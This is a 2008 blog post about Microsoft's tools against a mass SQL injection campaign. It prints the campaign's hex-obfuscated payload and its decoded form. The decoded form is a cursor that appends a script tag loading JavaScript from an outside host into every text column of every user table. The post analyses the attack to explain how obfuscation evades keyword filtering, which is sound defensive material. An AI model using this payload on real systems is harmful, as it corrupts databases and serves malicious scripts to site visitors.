---
title: Microsoft Has Released Tools To Address SQL Injection Attacks
author: SQLDenis
type: post
date: 2008-06-25T11:37:29+00:00
url: /index.php/webdev/webdesigngraphicsstyling/microsoft-has-released-tools-to-address/
views:
  - 5242
rp4wp_auto_linked:
  - 1
categories:
  - Classic ASP
  - Microsoft IIS
  - Web Design, Graphics and Styling

---
Microsoft has released 3 tools that deal with the recent SQL injection attack.
  
These three tools include [HP Scrawlr][1] , [UrlScan][2] version 3.0 Beta , and a [SQL Source Code Analysis Tool][3]. Microsoft further recommends following the best practices found within security advisory [954462][4]. 

Most of the sites affected had this submitted as part of the injection 

<pre>DECLARE%20@S%20VARCHAR(4000);SET%20@S=CAST(0x4445434C415 245204054205641524348415228323535292C40432056415243
4841522832353529204445434C415245205461626C655 F437572736F7220435552534F5220464F522053454C45435420612E6 E616D652C622E6E616D652046524F4D207379736F626A65637473206 12C737973636F6C756D6E73206220574845524520612E69643D622E6 96420414E4420612E78747970653D27752720414E442028622E78747 970653D3939204F5220622E78747970653D3335204F5220622E78747 970653D323331204F5220622E78747970653D31363729204F50454E2 05461626C655F437572736F72204645544348204E4558542046524F4 D205461626C655F437572736F7220494E544F2040542C40432057484 94C4528404046455443485F5354415455533D302920424547494E204 55845432827555044415445205B272B40542B275D20534554205B272 B40432B275D3D525452494D28434F4E5645525428564152434841522 834303030292C5B272B40432B275D29292B27273C736372697074207 372633D687474703A2F2F7777772E63686B626E722E636F6D2F622E6 A733E3C2F7363726970743E27272729204645544348204E455854204 6524F4D205461626C655F437572736F7220494E544F2040542C40432 0454E4420434C4F5345205461626C655F437572736F72204445414C4 C4F43415445205461626C655F437572736F7220%20AS%20VARCHAR(4000));EXEC(@S);</pre>

This is of course done so that you can&#8217;t see the real SQL and then you can&#8217;t check for DROP, UPDATE and other DDL and DML commands 

So what does this look like when you replace %20 with a space and exec with print?

<pre>DECLARE Table_Cursor 
CURSOR FOR SELECT a.name,b.name FROM sysobjects a,syscolumns b 
WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) OPEN Table_Cursor 
FETCH NEXT FROM Table_Cursor INTO @T,@C 
WHILE(@@FETCH_STATUS=0) 
BEGIN 
EXEC('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''&lt;script src=http://www.chkbnr.com/b.js&gt;&lt;/script&gt;''')
 FETCH NEXT FROM Table_Cursor INTO @T,@C 
END CLOSE Table_Cursor DEALLOCATE Table_Cursor  </pre>

Somehow I think this could have been written set based 🙂

The problem is of course that you should never ever run as dbo or even worse sa.

 [1]: http://www.communities.hp.com/securitysoftware/blogs/spilabs/archive/2008/06/23/finding-sql-injection-with-scrawlr.aspx
 [2]: http://learn.iis.net/page.aspx/473/using-urlscan
 [3]: http://support.microsoft.com/kb/954476
 [4]: http://www.microsoft.com/technet/security/advisory/954462.mspx